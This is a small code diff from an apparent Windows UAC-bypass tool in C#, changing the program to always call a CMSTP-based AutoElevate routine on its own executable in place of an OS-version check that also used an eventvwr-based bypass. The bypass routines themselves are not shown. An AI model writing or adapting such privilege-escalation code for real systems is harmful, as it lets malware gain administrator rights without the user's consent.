@@ -21,9 +21,7 @@ namespace UACBypass
                 Console.WriteLine("Bypassing UAC....");
 
                 //make a privilege escalation to get admin rights
-                if(OsSupport.IsTenOrBetter)
-                    CMSTPBypass.AutoElevate(System.Reflection.Assembly.GetExecutingAssembly().Location);
-                else EVENTVWRBypass.AutoElevate(System.Reflection.Assembly.GetExecutingAssembly().Location);
+                CMSTPBypass.AutoElevate(System.Reflection.Assembly.GetExecutingAssembly().Location);
             }
             else if(System.Security.Principal.WindowsIdentity.GetCurrent().IsSystem)
             {
